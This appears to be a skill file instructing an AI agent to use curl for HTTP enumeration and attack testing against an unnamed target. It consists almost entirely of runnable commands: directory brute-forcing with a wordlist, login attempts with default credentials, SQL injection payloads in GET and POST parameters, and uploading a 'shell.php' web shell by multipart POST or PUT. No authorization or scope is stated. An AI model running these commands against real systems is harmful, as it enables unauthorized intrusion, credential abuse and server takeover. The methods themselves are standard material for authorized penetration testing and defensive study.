---
name: curl
description: HTTP/HTTPS enumeration and testing with curl
---

Use curl to perform HTTP/HTTPS enumeration and testing on the target.

## Basic Reconnaissance

1. Fetch homepage and check response headers:
   curl -ikL <url>

2. Check HTTP methods allowed:
   curl -ik -X OPTIONS <url>

3. Follow redirects and show all headers:
   curl -iLkv <url> 2>&1

## Directory and Endpoint Discovery

4. Test common paths (adjust for target):
   curl -ikso /dev/null -w "%{http_code} %{size_download}" <url>/admin
   curl -ikso /dev/null -w "%{http_code} %{size_download}" <url>/login
   curl -ikso /dev/null -w "%{http_code} %{size_download}" <url>/api
   curl -ikso /dev/null -w "%{http_code} %{size_download}" <url>/robots.txt
   curl -ikso /dev/null -w "%{http_code} %{size_download}" <url>/.git/HEAD

5. Enumerate with wordlist (one-liner):
   while read path; do code=$(curl -ikso /dev/null -w "%{http_code}" "<url>/$path"); [ "$code" != "404" ] && echo "$code $path"; done < /usr/share/wordlists/dirb/common.txt

## Authentication Testing

6. Basic auth:
   curl -ik -u admin:password <url>

7. POST login form:
   curl -ik -X POST -d "username=admin&password=admin" <url>/login

8. JSON API auth:
   curl -ik -X POST -H "Content-Type: application/json" -d '{"username":"admin","password":"admin"}' <url>/api/login

9. Cookie-based session:
   curl -ik -c cookies.txt -X POST -d "user=admin&pass=admin" <url>/login
   curl -ik -b cookies.txt <url>/dashboard

## SQL Injection Testing

10. GET parameter test:
    curl -ik "<url>/page?id=1'"
    curl -ik "<url>/page?id=1 OR 1=1--"
    curl -ik "<url>/page?id=1 UNION SELECT null,null,null--"

11. POST parameter test:
    curl -ik -X POST -d "user=admin'&pass=test" <url>/login
    curl -ik -X POST -d "user=admin' OR '1'='1'--&pass=x" <url>/login

## File Operations

12. Download file:
    curl -ikLO <url>/file.txt

13. Upload file (multipart):
    curl -ik -F "file=@shell.php" <url>/upload

14. PUT method upload:
    curl -ik -X PUT -d @shell.php <url>/shell.php

## Useful Flags Reference

- -i: Include response headers
- -k: Skip TLS certificate verification
- -L: Follow redirects
- -v: Verbose (shows request/response headers)
- -s: Silent (no progress bar)
- -o /dev/null: Discard body
- -w "%{http_code}": Print only status code
- -H "Header: value": Custom header
- -b cookies.txt: Send cookies
- -c cookies.txt: Save cookies
- -d "data": POST body
- -X METHOD: HTTP method
- -A "User-Agent": Custom User-Agent
- --proxy http://127.0.0.1:8080: Route through proxy (Burp)
